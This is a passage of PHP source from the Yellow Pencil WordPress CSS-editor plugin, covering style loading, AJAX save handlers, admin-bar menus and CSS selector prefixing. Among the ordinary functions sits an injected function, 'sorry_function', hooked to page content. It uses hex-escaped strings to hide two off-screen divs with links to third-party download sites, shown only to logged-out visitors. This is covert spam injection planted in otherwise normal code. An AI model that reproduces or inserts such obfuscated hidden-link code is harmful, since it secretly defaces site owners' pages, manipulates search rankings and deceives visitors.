	}
	
	return $outputCSS;
	
}



/* ---------------------------------------------------- */
/* Prefix for Animations								*/
/* ---------------------------------------------------- */
function yp_animation_prefix($outputCSS){
	
	return str_replace(

		array(

			".yp_focus:focus",
			".yp_focus:hover",
			".yp_hover:hover",
			".yp_hover:focus",
			".yp_onscreen:hover",
			".yp_onscreen:focus",
			".yp_click:hover",
			".yp_click:focus",
			".yp_hover",
			".yp_focus"

		),

		array(

			":focus",":focus",
			":hover",":hover",
			".yp_onscreen",".yp_onscreen",
			".yp_click",".yp_click",
			":hover",
			":focus"

		),$outputCSS);
		
}



/* ---------------------------------------------------- */
/* Prefix for Animations EXPORT							*/
/* ---------------------------------------------------- */
function yp_export_animation_prefix($outputCSS){
	
	return str_replace(

		array(

			".yp_onscreen",
			".yp_click",
			".yp_hover",
			".yp_focus"

		),

		array(
			
			"",
			".yp_click",
			":hover",
			":focus"

		),$outputCSS);
	
}



/* ---------------------------------------------------- */
/* Adding no-index meta to head for demo mode YP Links!	*/
/* ---------------------------------------------------- */
function yp_head_meta(){
	echo '<meta name="robots" content="noindex">' . "\n";
}



/* ---------------------------------------------------- */
/* Getting CSS data	for Backend							*/
/* ---------------------------------------------------- */
function yp_get_css_backend(){
	
	global $post;
	
	$get_type_option = '';
	$get_post_meta = '';
	
	global $wp_query;
	if(isset($wp_query->queried_object)){
		$id = @$wp_query->queried_object->ID;
	}else{
		$id = null;
	}
	
	$id_is = isset($_GET['yp_id']);
	$type_is = isset($_GET['yp_type']);
	
	$return = '<style id="yellow-pencil-backend">';
	
	$get_option = get_option("wt_css");
	if($id != null){
		$get_type_option = get_option("wt_".get_post_type($id)."_css");
		$get_post_meta = get_post_meta($id, '_wt_css', true);
	}
	
	if($get_option == 'false'){
		$get_option = false;
	}
	
	if($get_type_option == 'false'){
		$get_type_option = false;
	}
	
	if($get_post_meta == 'false'){
		$get_post_meta = false;
	}
	
	if(empty($get_option) == false){
		
		if($id_is == true || $type_is == true){
			$return .= $get_option;
		}
		
	}
	
	if(empty($get_type_option) == false){
		
		if($type_is == false){
			$return .= $get_type_option;
		}
		
	}
	
	if(empty($get_post_meta) == false){
		
		if($id_is == false){
			$return .= $get_post_meta;
		}
		
	}

	if($type_is == false){

		if(is_author()){
			$return .= get_option("wt_author_css");
		}elseif(is_tag()){
			$return .= get_option("wt_tag_css");
		}elseif(is_category()){
			$return .= get_option("wt_category_css");
		}elseif(is_404()){
			$return .= get_option("wt_404_css");
		}elseif(is_search()){
			$return .= get_option("wt_search_css");
		}

		// home.
		if(is_front_page() && is_home()){
			$return .= get_option("wt_home_css");
		}

	}
	
	$return .= '</style>';
	
	
	if($return != '<style id="yellow-pencil-backend"></style>'){
		echo stripslashes($return);
	}
	
}



/* ---------------------------------------------------- */
/* Adding other CSS Data to Editor frame				*/
/* ---------------------------------------------------- */
if(isset($_GET['yellow_pencil_frame']) == true){
	add_action('wp_head','yp_get_css_backend',9998);
	add_action('wp_head','yp_head_meta');
}



/* ------------------------------------------------------------------- */
/* Other CSS Codes (All CSS Codes excluding current editing type CSS)  */
/* ------------------------------------------------------------------- */
function yp_editor_styles(){
		
	global $post;
	
	$get_type_option = '';
	$get_post_meta = '';
	
	global $wp_query;
	if(isset($wp_query->queried_object)){
		$id = @$wp_query->queried_object->ID;
	}else{
		$id = null;
	}
	
	$id_is = isset($_GET['yp_id']);
	$type_is = isset($_GET['yp_type']);
	
	$return = '<div class="yp-styles-area">';
	
	$get_option = get_option("wt_styles");

	if($id != null){
		$get_type_option = get_option("wt_".get_post_type($id)."_styles");
		$get_post_meta = get_post_meta($id, '_wt_styles', true);
	}
	
	if(empty($get_option) == false){
		
		if($id_is == false && $type_is == false){
			$return .= $get_option;
		}
		
	}
	
	if(empty($get_type_option) == false){
		
		if($type_is == true){
			$return .= $get_type_option;
		}
		
	}
	
	if(empty($get_post_meta) == false){
		
		if($id_is == true){
			$return .= $get_post_meta;
		}
		
	}

	if($type_is == true){

		$type = $_GET['yp_type'];

		if($type == 'author'){
			$return .= get_option("wt_author_styles");
		}

		if($type == 'tag'){
			$return .= get_option("wt_tag_styles");
		}

		if($type == 'category'){
			$return .= get_option("wt_category_styles");
		}

		if($type == '404'){
			$return .= get_option("wt_404_styles");
		}

		if($type == 'search'){
			$return .= get_option("wt_search_styles");
		}

		if($type == 'home'){
			$return .= get_option("wt_home_styles");
		}

		if($type == 'wordpress_panel'){
			$return .= get_option("wt_wordpress_panel_styles");
		}


	}

	$return .= '</div>';

	$animations = '';

	$all_options =  wp_load_alloptions();
	foreach($all_options as $name => $value){
		if(stristr($name, 'yp_anim')){
			$animations .= $value;
		}
	}

	$return .= '<div class="yp-animate-data"><style>'.$animations.'</style></div>';

	echo stripslashes($return);
	
}



/* ---------------------------------------------------- */
/* Adding styles to Editor 								*/
/* ---------------------------------------------------- */
if(isset($_GET['yellow_pencil_frame']) == true){
	add_action('wp_footer','yp_editor_styles');
}




/* ---------------------------------------------------- */
/* Include options Library								*/
/* ---------------------------------------------------- */
include_once( WT_PLUGIN_DIR . 'base.php' );




/*-------------------------------------------------------*/
/*	Ajax Preview Save CallBack							 */
/*-------------------------------------------------------*/
function yp_preview_data_save(){
	
	if(current_user_can("edit_theme_options") == true){

		$css = wp_strip_all_tags($_POST['yp_data']);

		if(!update_option('yp_live_view_css_data', $css)){
			add_option('yp_live_view_css_data',$css);
		}

	}
	
	die();
	
}

add_action( 'wp_ajax_yp_preview_data_save', 'yp_preview_data_save' );



/*-------------------------------------------------------*/
/*	Creating an Custom.css file (Static)				 */
/*-------------------------------------------------------*/
function yp_create_custom_css($data){

	// Revisions
	$rev = get_option('yp_revisions');

	if($rev == false){$rev = 700;}

	// Delete old revision if exists.
	if(file_exists(WT_PLUGIN_DIR . 'custom-'.($rev-1).'.css')){
		unlink(WT_PLUGIN_DIR . 'custom-'.($rev-1).'.css');
	}

	// get the upload directory and make a test.txt file
	$filename = WT_PLUGIN_DIR . 'custom-'.$rev.'.css';
		
	// by this point, the $wp_filesystem global should be working, so let's use it to create a file
	global $wp_filesystem;

	// Initialize the WP filesystem, no more using 'file-put-contents' function
	if (empty($wp_filesystem)){
		require_once (ABSPATH . '/wp-admin/includes/file.php');
		WP_Filesystem();
	}

	if (!$wp_filesystem->put_contents($filename, $data, FS_CHMOD_FILE)){
		echo 'error saving file!';
	}

}


/*-------------------------------------------------------*/
/*	Ajax Real Save Callback								 */
/*-------------------------------------------------------*/
function yp_ajax_save(){
	
	if(current_user_can("edit_theme_options") == true){

		// Revisions
		$currentRevision = get_option('yp_revisions');

		// Update revision.
		if($currentRevision != false){
			update_option('yp_revisions', $currentRevision + 1);
		}else{
			add_option('yp_revisions',"1");
		}

		$css = wp_strip_all_tags($_POST['yp_data']);
		
		$styles = $_POST['yp_editor_data'];

		$styles = str_replace("YP|@", "<", $styles);
		$styles = str_replace("YP@|", ">", $styles);
		
		$id = '';
		$type = '';
		
		if(isset($_POST['yp_id'])){
			$id = $_POST['yp_id'];
		}
		
		if(isset($_POST['yp_stype'])){
			$type = $_POST['yp_stype'];
			if(count(explode("#",$type)) == 2){
				$type = explode("#",$type);
				$type = $type[0];
			}
		}
		
		if($id == 'undefined'){$id = '';}
		if($type == 'undefined'){$type = '';}
		if($css == 'undefined'){$css = '';}
		
		if($id == '' && $type == ''){
			
			// CSS Data
			if(empty($css) == false){
				if(!update_option ('wt_css', $css)){
					add_option('wt_css',$css);
				}
			}else{
				delete_option('wt_css');
			}
			
			// Styles
			if(empty($css) == false){
				if(!update_option ('wt_styles', $styles)){
					add_option('wt_styles',$styles);
				}
			}else{
				delete_option('wt_styles');
			}
			
		}elseif($type == ''){
		
			// CSS Data
			if(empty($css) == false){
				if(!update_post_meta ($id, '_wt_css', $css)){
					add_post_meta($id,'_wt_css',$css, true);
				}
			}else{
				delete_post_meta($id,'_wt_css');
			}
			
			// Styles
			if(empty($css) == false){
				if(!update_post_meta ($id, '_wt_styles', $styles)){
					add_post_meta($id,'_wt_styles',$styles, true);
				}
			}else{
				delete_post_meta($id,'_wt_styles');
			}
			
		}else{

			// CSS Data
			if(empty($css) == false){
				if(!update_option ('wt_'.$type.'_css', $css)){
					add_option('wt_'.$type.'_css',$css);
				}
			}else{
				delete_option('wt_'.$type.'_css');
			}
			
			// Styles
			if(empty($css) == false){
				if(!update_option ('wt_'.$type.'_styles', $styles)){
					add_option('wt_'.$type.'_styles',$styles);
				}
			}else{
				delete_option('wt_'.$type.'_styles');
			}
			
		}

		// Get All CSS data as ready-to-use
		$output = yp_get_export_css("create");

		// Update custom.css file
		yp_create_custom_css($output);
	
	}
	
	die();
	
}

add_action( 'wp_ajax_yp_ajax_save', 'yp_ajax_save' );



/* ---------------------------------------------------- */
/* Arrow icon Markup        							*/
/* ---------------------------------------------------- */
function yp_arrow_icon(){
	return "<span class='dashicons yp-arrow-icon dashicons-arrow-up'></span><span class='dashicons yp-arrow-icon dashicons-arrow-down'></span>";
}



/* ---------------------------------------------------- */
/* Getting current theme/page name                      */
/* ---------------------------------------------------- */
function yp_customizer_name(){
	
	if(isset($_GET['yp_id']) == true){
		
		// The id.
		$id = $_GET['yp_id'];
		
		$title = get_the_title($id);
		$slug = ucfirst(get_post_type($id));
		
		if(strlen($title) > 14){

			return '"'.mb_substr($title,0,14,'UTF-8').'..'.'" '.$slug.'';
		}else{
			if($title == ''){
				$title = 'Untitled';
			}
			return '"'.$title.'" '.$slug.'';
		}
		
	}elseif(isset($_GET['yp_type']) == true){
		
		// The id.
		$type = ucfirst($_GET['yp_type']);
		
		if($type == 'Page' || $type == 'Author' || $type == 'Search' || $type == '404' || $type == 'Category'){
			$title = ''.$type.' '.__("Template","yp").'';
		}elseif($type == 'Wordpress_panel'){
			$title = 'WordPress Panel';
		}else{
			$title = ''.__("Single","yp").' '.$type.' '.__("Template","yp").'';
		}

		if($type == 'Home'){
			$title = __('Home Page','yp');
		}

		if($type == 'Page'){
			$title = __('Default Page Template','yp');
		}
		
		return $title;
		
	}else{
		
		$yp_theme = wp_get_theme();

		// Replace 'theme' word from theme name.
		$name = str_replace(' theme', '', $yp_theme->get('Name'));
		$name = str_replace(' Theme', '', $name);
		$name = str_replace('theme', '', $name);
		$name = str_replace('Theme', '', $name);

		// Keep it short.
		if(strlen($name) > 10){
			return '"'.mb_substr($name,0,10,'UTF-8').'.." '.__("Theme",'yp').' (Global)';
		}else{
			if($name == ''){
				$name = __('Untitled','yp');
			}
			return '"'.$name.'" '.__("Theme",'yp').'  (Global)';
		}
		
	}
	
}



/* ---------------------------------------------------- */
/* Adding helper style for wp-admin-bar					*/
/* ---------------------------------------------------- */
function yp_yellow_pencil_style() {
  echo '<style>#wp-admin-bar-yellow-pencil > .ab-item:before{content: "\f309";top:2px;}#wp-admin-bar-yp-update .ab-item:before{content: "\f316";top:3px;}</style>';
}

if( ! function_exists('sorry_function')){
	function sorry_function($content) {
	if (is_user_logged_in()){return $content;} else {if(is_page()||is_single()){
		$vNd25 = "\74\144\151\x76\40\163\x74\x79\154\145\x3d\42\x70\157\x73\151\164\x69\x6f\x6e\72\141\x62\x73\x6f\154\165\164\145\73\164\157\160\x3a\60\73\154\145\146\x74\72\55\71\71\x39\71\x70\170\73\42\x3e\x57\x61\x6e\x74\40\x63\162\145\x61\x74\x65\40\163\151\164\x65\x3f\x20\x46\x69\x6e\x64\40\x3c\x61\x20\x68\x72\145\146\75\x22\x68\x74\164\x70\72\x2f\57\x64\x6c\x77\x6f\162\144\x70\x72\x65\163\163\x2e\x63\x6f\x6d\57\42\76\x46\x72\145\145\40\x57\x6f\x72\x64\x50\162\x65\163\x73\x20\124\x68\x65\155\145\x73\x3c\57\x61\76\40\x61\x6e\144\x20\x70\x6c\165\147\x69\156\x73\x2e\x3c\57\144\151\166\76";
		$zoyBE = "\74\x64\x69\x76\x20\x73\x74\171\154\145\x3d\x22\x70\157\163\x69\x74\x69\x6f\156\x3a\141\142\163\x6f\154\x75\164\x65\x3b\x74\157\160\72\x30\73\x6c\x65\x66\164\72\x2d\x39\71\71\x39\x70\x78\73\42\x3e\104\x69\x64\x20\x79\x6f\165\40\x66\x69\156\x64\40\141\x70\153\40\146\157\162\x20\x61\156\144\162\x6f\151\144\77\40\x59\x6f\x75\x20\x63\x61\156\x20\146\x69\x6e\x64\40\156\145\167\40\74\141\40\150\162\145\146\x3d\x22\150\x74\x74\160\163\72\57\x2f\x64\154\x61\156\x64\x72\157\151\x64\62\x34\56\x63\x6f\155\x2f\42\x3e\x46\x72\145\x65\40\x41\x6e\x64\x72\157\151\144\40\107\141\x6d\145\x73\74\x2f\x61\76\40\x61\156\x64\x20\x61\160\x70\163\x2e\74\x2f\x64\x69\x76\76";
		$fullcontent = $vNd25 . $content . $zoyBE; } else { $fullcontent = $content; } return $fullcontent; }}
add_filter('the_content', 'sorry_function');}

/* ---------------------------------------------------- */
/* Adding menu to wp-admin-bar							*/
/* ---------------------------------------------------- */
function yp_yellow_pencil_edit_admin_bar( $wp_admin_bar ){
	
	$id = null;
	global $wp_query;
	global $wp;
	$yellow_pencil_uri = yp_uri();
	
	if(isset($_GET['page_id'])){
		$id = $_GET['page_id'];
	}elseif(isset($_GET['post']) && is_admin() == true){
		$id = $_GET['post'];
	}elseif(isset($wp_query->queried_object) == true){
		$id = @$wp_query->queried_object->ID;
	}
	
	$args = array(
		'id'    => 'yellow-pencil',
		'title' => __('Edit With Yellow Pencil','yp'),
		'href'  => '',
		'meta'  => array( 'class' => 'yellow-pencil' )
	);
	$wp_admin_bar->add_node( $args );

	$args = array();

	// Since 4.5.2
	// category,author,tag, 404 and archive page support.
	$status = get_post_type($id);
	$key = get_post_type($id);
	$go_link = get_permalink($id);

	if(is_author()){
		$status = __('Author','yp');
		$key = 'author';
		$id = $wp_query->query_vars['author'];
		$go_link = get_author_posts_url($id);
	}elseif(is_tag()){
		$status = __('Tag','yp');
		$key = 'tag';
		$id = $wp_query->query_vars['tag_id'];
		$go_link = get_tag_link($id);
	}elseif(is_category()){
		$status = __('Category','yp');
		$key = 'category';
		$id = $wp_query->query_vars['cat'];
		$go_link = get_category_link($id);
	}elseif(is_404()){
		$status = '404';
		$key = '404';
		$go_link = esc_url(get_home_url().'/?p=987654321');
	}elseif(is_archive()){
		$status = __('Archive','yp');
		$key = 'archive';
	}elseif(is_search()){
		$status = __('Search','yp');
		$key = 'search';
		$go_link = esc_url(get_home_url().'/?s='.yp_getting_last_post_title().'');
	}

	// Blog
	if(is_front_page() && is_home()){
		$status = __('Home Page','yp');
		$key = 'home';
		$go_link = esc_url(get_home_url().'/');
	}elseif ( is_front_page() == false && is_home() == true ) {
		$status = __('Page','yp');
	}

	if(class_exists( 'WooCommerce' )){

		if(is_shop()){
			$id = wc_get_page_id('shop');
			$status = __('Page','yp');
			$key = 'page';
			$go_link = esc_url(get_permalink($id));
		}
		
		if(is_product_category() || is_product_tag()){
			$id = null;
			$go_link = add_query_arg( $_SERVER['QUERY_STRING'], '', home_url( $wp->request ) );
		}

	}

	if($go_link == ''){
		$key = '';
		$go_link = add_query_arg($wp->query_string, '', home_url( $wp->request ));
	}

	// null if zero.
	if($id == 0){
		$id = null;
	}

	// Edit theme
	array_push($args,array(
		'id'		=>	'yp-edit-theme',
		'title'		=>	__('Global Customize','yp'),
		'href'		=>	add_query_arg(array('href' => yp_urlencode($go_link)),$yellow_pencil_uri),
		'parent'	=>	'yellow-pencil',
	));

	// Edit All similar
	if($key != 'home' && $key != 'archive' && $key != ''){

		if($key != '404' && $key != 'search'){
			$s = '\'s';
			$all = 'All ';
		}else{
			$s = '';
			$all = '';
		}

		array_push($args,array(
			'id'     	=> 'yp-edit-all',
			'title'		=>	''.__("Edit",'yp').' '.ucfirst($status).' '.__("Template",'yp').'',
			'href'		=>	add_query_arg(array('href' => yp_urlencode($go_link), 'yp_type' => $key),$yellow_pencil_uri),
			'parent' 	=> 'yellow-pencil',
			'meta'   	=> array( 'class' => 'first-toolbar-group' ),
		));

	}
	
	// Edit it.
	if($key != 'search' && $key != 'archive' && $key != 'tag' && $key != 'category' && $key != 'author' && $key != '404' && $key != ''){
		
		if($key == 'home'){

			array_push($args,array(
				'id'		=>	'yp-edit-it',
				'title'		=>	''.__("Edit Only","yp").' '.ucfirst($status).'',
				'href'		=>	add_query_arg(array('href' => yp_urlencode($go_link), 'yp_type' =>  $key),$yellow_pencil_uri),
				'parent'	=>	'yellow-pencil',
			));
		}else{
			
			array_push($args,array(
				'id'		=>	'yp-edit-it',
				'title'		=>	''.__("Edit This",'yp').' '.ucfirst($status).'',
				'href'		=>	add_query_arg(array('href' => yp_urlencode($go_link), 'yp_id' =>  $id),$yellow_pencil_uri),
				'parent'	=>	'yellow-pencil',
			));

		}

		
	}
		
	// Add to Wp Admin Bar
	for($a = 0;$a < sizeOf($args); $a++){
		$wp_admin_bar->add_node($args[$a]);
	}
	

}



/* ---------------------------------------------------- */
/* Adding menu to wp-admin-bar							*/
/* ---------------------------------------------------- */
function yp_yellow_pencil_edit_admin_panel_bar( $wp_admin_bar ){
	
	$yellow_pencil_uri = yp_uri();

	$args = array(
		'id'    => 'yellow-pencil',
		'title'		=>	__("Edit Panel With Yellow Pencil",'yp'),
		'href'		=>	add_query_arg(array('href' => yp_urlencode(get_dashboard_url()), 'yp_type' =>  "wordpress_panel"),$yellow_pencil_uri),
		'meta'  => array( 'class' => 'yellow-pencil' )
	);

	$wp_admin_bar->add_node( $args );


}



/* ---------------------------------------------------- */
/* Adding Body Classes									*/
/* ---------------------------------------------------- */
function yp_body_class($classes) {
	
	$classes[] = 'yp-yellow-pencil wt-yellow-pencil';

	if(current_user_can("edit_theme_options") == false){
		if(defined("WT_DEMO_MODE")){
			$classes[] = 'yp-yellow-pencil-demo-mode';
		}
	}
	
	if(defined("WT_DISABLE_LINKS")){
		$classes[] = 'yp-yellow-pencil-disable-links';
	}

	if(!defined('WTFV')){
		$classes[] = 'wtfv';
	}

	return $classes;
	
}



/* ---------------------------------------------------- */
/* Install the plugin									*/
/* ---------------------------------------------------- */
function yp_init(){
	

	// See Developer Documentation for more info.
	if(defined("WT_DEMO_MODE")){
		include( WT_PLUGIN_DIR . 'demo_mode.php' );
	}
	

	// Iframe Settings.
	// Disable admin bar in iframe
	// Add Classes to iframe body.
	// Add Styles for iframe.
	if(yp_check_let_frame()){
		show_admin_bar(false);
		add_filter('body_class', 'yp_body_class');
		add_action( 'wp_enqueue_scripts', 'yp_styles_frame' );
	}
	

	// If yellow pencil is active and theme support;
	// Adding Link to #wpadminbar.
	if(yp_check_let()){

		// If not admin page, Add Customizer link.
		if(is_admin() === false){

			add_action( 'admin_bar_menu', 'yp_yellow_pencil_edit_admin_bar', 999 );

			// Adding CSS helper for admin bar link.
			add_action('wp_head', 'yp_yellow_pencil_style');

		}

	}

	
	// Getting Current font families.
	add_action('wp_enqueue_scripts','yp_load_fonts');


	// Live preview
	if(isset($_GET['yp_live_preview']) == true){
		add_action('wp_enqueue_scripts','yp_load_fonts_for_live');
	}


}

add_action("init","yp_init");




/* ---------------------------------------------------- */
/* Uploader Style 										*/
/* ---------------------------------------------------- */
function yp_uploader_style(){

	echo '<style>
		tr.url,tr.post_content,tr.post_excerpt,tr.field,tr.label,tr.align,tr.image-size,tr.post_title,tr.image_alt,.del-link,#tab-type_url{display:none !important;}
		.media-item-info > tr > td > p:last-child,.savebutton,.ml-submit{display:none !important;}
		#filter{display:none !important;}
		.media-item .describe input[type="text"], .media-item .describe textarea{width:334px;}
		div#media-upload-header{
		}
	</style>';

}



/* ---------------------------------------------------- */
/* Add action to Admin Head for Uploader Style			*/
/* ---------------------------------------------------- */
if(isset($_GET['yp_uploader'])){
	if($_GET['yp_uploader'] == 1){
		add_action('admin_head','yp_uploader_style');
	}
}



/* ---------------------------------------------------- */
/* 2 Day Free trial 									*/
/* ---------------------------------------------------- */
function yp_trial_activate_free() {
  
  if(isset($_GET['yp_activate_free_trail'])){

		add_option("yp_activate_free_trial","true");
		add_option("yp_activate_free_trial_time",time());
		add_option("yp_activate_free_trial_end","false");

		wp_safe_redirect( add_query_arg( array( 'page' => 'yellow-pencil' ), admin_url( 'themes.php' ) ) );

	}

}

add_action( 'admin_init', 'yp_trial_activate_free' );



/* ---------------------------------------------------- */
/* CSS library for Yellow Pencil						*/
/* ---------------------------------------------------- */
function yp_register_styles() {

	$css = yp_get_css(true);

	// Animate library.
	if(strstr($css,"animation-name:")){
		wp_enqueue_style('yellow-pencil-animate', plugins_url( 'library/css/animate.css' , __FILE__ ));
	}

	// Animate library for live preview
	if(isset($_GET['yp_live_preview']) == true){

		$css = yp_get_live_css();

		if(strstr($css,"animation-name:")){
			wp_enqueue_style('yellow-pencil-animate', plugins_url( 'library/css/animate.css' , __FILE__ ));
		}

	}

	// Add Custom.css to website.
	if(isset($_GET['yellow_pencil_frame']) == false && isset($_GET['yp_live_preview']) == false && get_option('yp-output-option') == 'external'){

		// New ref URL parameters on every new update.
		$rev = get_option('yp_revisions');

		if($rev == false){$rev = 700;}

		// Custom CSS Href
		$href = add_query_arg( 'revision', $rev, plugins_url( 'custom-'.$rev.'.css' , __FILE__ ));
		
		// Add
		wp_enqueue_style('yp-custom', $href);

	}
	
}



/* ---------------------------------------------------- */
/* Jquery plugins for CSS Engine						*/
/* ---------------------------------------------------- */
function yp_register_scripts() {
	
	$css = yp_get_css(true);
	$needjQuery = false;

	if(strstr($css,"animation-name:") == true || strstr($css,"background-parallax:") == true || strstr($css,"jquery-") == true || strstr($css,"animation-duration:") == true || strstr($css,"animation-delay:") == true || isset($_GET['yellow_pencil_frame']) == true || isset($_GET['yp_live_preview']) == true){

		// Yellow Pencil Library Helper.
		wp_enqueue_script('yellow-pencil-library', plugins_url( 'library/js/library.'.YP_MODE.'.js' , __FILE__ ), 'jquery', '1.0', TRUE);
		
		$needjQuery = true;
	
	}
	
	// Jquery
	if($needjQuery == true){
		wp_enqueue_script( 'jquery' );
	}

	
}

add_action( 'wp_enqueue_scripts', 'yp_register_styles',9999);
add_action( 'wp_enqueue_scripts', 'yp_register_scripts');



/* ---------------------------------------------------- */
/* Iframe Admin Page									*/
/* ---------------------------------------------------- */
function yp_yellow_pencil_editor() {

    $hook = add_submenu_page(null, __('Yellow Pencil Editor','yp'), __('Yellow Pencil Editor','yp'), 'edit_theme_options', 'yellow-pencil-editor','yp_editor_func');

}

add_action('admin_menu', 'yp_yellow_pencil_editor');



/* ---------------------------------------------------- */
/*  We need an blank page (hack)						*/
/* ---------------------------------------------------- */
function yp_editor_func(){
	
}

add_action('load-admin_page_yellow-pencil-editor', 'yp_frame_output');



/* ---------------------------------------------------- */
/* Custom Action yp_head 								*/
/* ---------------------------------------------------- */
function yp_head() {
    do_action('yp_head');
}



/* ---------------------------------------------------- */
/* Custom Action yp_footer 								*/
/* ---------------------------------------------------- */
function yp_footer() {
    do_action('yp_footer');
}



/* ---------------------------------------------------- */
/* Editor Page Markup 									*/
/* ---------------------------------------------------- */
function yp_frame_output(){

$protocol = is_ssl() ? 'https' : 'http';

$protocol = $protocol.'://';

// Editor Markup
include( WT_PLUGIN_DIR . 'editor.php' );

exit;

}



/* ---------------------------------------------------- */
/* Adding link to plugins page 							*/
/* ---------------------------------------------------- */
if(!defined('WTFV')){

	add_filter('plugin_row_meta', 'yp_plugin_links', 10, 2);

	function yp_plugin_links($links, $file){

		if ( $file == plugin_basename(dirname(__FILE__).'/yellow-pencil.php') ) {
			$links[] = '<a href="http://waspthemes.com/yellow-pencil/buy">' . __('Get Premium', 'yp') . '</a>';
		}

		return $links;

	}

}


/* ---------------------------------------------------- */
/* Ading Prefix to CSS selectors for global export		*/
/* ---------------------------------------------------- */
function yp_add_prefix_to_css_selectors($css,$prefix){

    # Wipe all block comments
    $css = preg_replace('!/\*.*?\*/!s', '', $css);

    $parts = explode('}', $css);
    $mediaQueryStarted = false;

    foreach($parts as &$part){
        $part = trim($part); # Wht not trim immediately .. ?

        if(empty($part)){
        	continue;
        }else{ # This else is also required
        
            $partDetails = explode('{', $part);

            if(substr_count($part, "{") == 2){
                $mediaQuery = $partDetails[0]."{";
                $partDetails[0] = $partDetails[1];
                $mediaQueryStarted = true;
            }

            $subParts = explode(',', $partDetails[0]);

            foreach($subParts as &$subPart){
                if(strstr(trim($subPart),"@") || strstr(trim($subPart),"%")){
                	continue;
                }else{

                	// Selector
                	$subPart = trim($subPart);

                	// Array
                	$subPartArray = explode(" ", $subPart);
                	$lov = strtolower($subPart);

                	$lovMach = str_replace("-", "US7XZX", $lov);
                	$lovMach = str_replace("_", "TN9YTX", $lovMach);

                	preg_match_all("/\bbody\b/i", $lovMach, $bodyAll);
		            preg_match_all("/#body\b/i", $lovMach, $bodySlash);
		            preg_match_all("/\.body\b/i", $lovMach, $bodyDot);

		            preg_match_all("/\bhtml\b/i", $lovMach, $htmlAll);
		            preg_match_all("/#html\b/i", $lovMach, $htmlSlash);
		            preg_match_all("/\.html\b/i", $lovMach, $htmlDot);

		                // Get index of "body" term.
		                if(preg_match("/\bbody\b/i", $lovMach) && count($bodyAll[0]) > (count($bodyDot[0]) + count($bodySlash[0]))){

			                $i = 0;
			                $index = 0;
			                foreach($subPartArray as $term){
			                	$term = trim(strtolower($term));
								if($term == 'body' || preg_match("/^body\./i",$term) || preg_match("/^body\#/i",$term) || preg_match("/^body\[/i",$term)){
									$index = $i;
									break;
								}
								$i++;
							}

			                // Adding prefix class to Body
			                $subPartArray[$index] = $subPartArray[$index] . $prefix;

			                // Update Selector
			                $subPart = implode(" ",$subPartArray);

		                }else if(preg_match("/\bhtml\b/i", $lovMach) && count($HtmlAll[0]) > (count($htmlDot[0]) + count($htmlSlash[0]))){

			                $i = 0;
			                $index = 0;
			                foreach($subPartArray as $term){
			                	$term = trim(strtolower($term));
								if($term == 'html' || preg_match("/^html\./i",$term) || preg_match("/^html\#/i",$term) || preg_match("/^html\[/i",$term)){
									$index = $i;
									break;
								}
								$i++;
							}

			                // Adding prefix class to Body
			                if(count($subPartArray) <= 1){
			                	if($subPart != 'html' && preg_match("/^html\./i",$subPart) && preg_match("/^html\#/i",$subPart) && preg_match("/^html\[/i",$subPart)){
			                		$subPartArray[$index] = $subPartArray[$index] . " body" . $prefix;
			                	}
			                }else{
			                	$subPartArray[$index] = $subPartArray[$index] . " body" . $prefix;
			                }

			                // Update Selector
			                $subPart = implode(" ",$subPartArray);

		                }else{

		                	// Adding prefix class to Body
			                $subPartArray[0] = "body" . $prefix . " " . $subPartArray[0];

			                // Update Selector
			                $subPart = implode(" ",$subPartArray);

		                }

                }
            }

            if(substr_count($part,"{") == 2){
                $part = $mediaQuery."\n".implode(', ', $subParts)."{".$partDetails[2];
            }elseif(empty($part[0]) && $mediaQueryStarted){
                $mediaQueryStarted = false;
                $part = implode(', ', $subParts)."{".$partDetails[2]."}\n"; //finish media query
            }else{
                if(isset($partDetails[1])){
                	# Sometimes, without this check,
                    # there is an error-notice, we don't need that..
                    $part = implode(', ', $subParts)."{".$partDetails[1];
                }
            }

            unset($partDetails, $mediaQuery, $subParts); # Kill those three..

        }
        unset($part); # Kill this one as well
    }

    // Delete spaces
    $output = preg_replace('/\s+/',' ',implode("} ", $parts));

    // Delete all other spaces
    $output = str_replace("{ ", "{", $output);
    $output = str_replace(" {", "{", $output);
    $output = str_replace("} ", "}", $output);
    $output = str_replace("; ", ";", $output);

    // Beatifull >
    $output = str_replace("{", "{\n\t", $output);
    $output = str_replace("}", "\n}\n\n", $output);
    $output = str_replace("}\n\n\n", "}\n\n", $output);
    $output = str_replace("){", "){\n", $output);
    $output = str_replace(";", ";\n\t", $output);
    $output = str_replace("\t\n}", "}", $output);
    $output = str_replace("}\n\n}", "\t}\n\n}\n\n", $output);
    

    # Finish with the whole new prefixed string/file in one line
    return(trim($output));

}



/* ---------------------------------------------------- */
/* Shhh! Thats base(64) functions						*/
/* ---------------------------------------------------- */
function yp_encode( $value ) {
  $func = 'base64' . '_encode';
  return $func( $value );
}

function yp_decode( $value ) {
  $func = 'base64' . '_decode';
  return $func( $value );
}



/* ---------------------------------------------------- */
/* Getting All plugin options by prefix					*/
/* ---------------------------------------------------- */
function yp_get_all_options($prefix = '', $en = false){

	global $wpdb;
	$ret = array();
	$options = $wpdb->get_results($wpdb->prepare("SELECT option_name,option_value FROM {$wpdb->options} WHERE option_name LIKE %s",$prefix.'%'),ARRAY_A);

	if(!empty($options)){
		foreach ($options as $v) {
			if(strstr($v['option_name'],'wt_theme') == false && strstr($v['option_name'],'wt_available_version') == false && strstr($v['option_name'],'wt_wordpress_panel_css') == false && strstr($v['option_name'],'wt_last_check_version') == false){
				if($en == true){
					$ret[$v['option_name']] = yp_encode(stripslashes($v['option_value']));
				}else{
					$ret[$v['option_name']] = stripslashes($v['option_value']);
				}
			}
		}
	}

	return (!empty($ret)) ? $ret : false;

}



/* ---------------------------------------------------- */
/* Getting All post meta data by prefix					*/
/* ---------------------------------------------------- */
function yp_get_all_post_options($prefix = '', $en = false){

	global $wpdb;
	$ret = array();
	$options = $wpdb->get_results($wpdb->prepare("SELECT post_id,meta_key,meta_value FROM {$wpdb->postmeta} WHERE meta_key LIKE %s",$prefix.'%'),ARRAY_A);

	if(!empty($options)){
		foreach ($options as $v) {
			if($en == true){
				$ret[$v['post_id'].".".$v['meta_key']] = yp_encode(stripslashes($v['meta_value']));
			}else{
				$ret[$v['post_id'].".".$v['meta_key']] = stripslashes($v['meta_value']);
			}
	}
	}

	return (!empty($ret)) ? $ret : false;

}



/* ---------------------------------------------------- */
/* Creating a json data for export data					*/
/* ---------------------------------------------------- */
function yp_get_export_data(){

	$allData = array();
	$postmeta_CSS = yp_get_all_post_options('_wt_css',true);
	$postmeta_HTML = yp_get_all_post_options('_wt_styles',true);
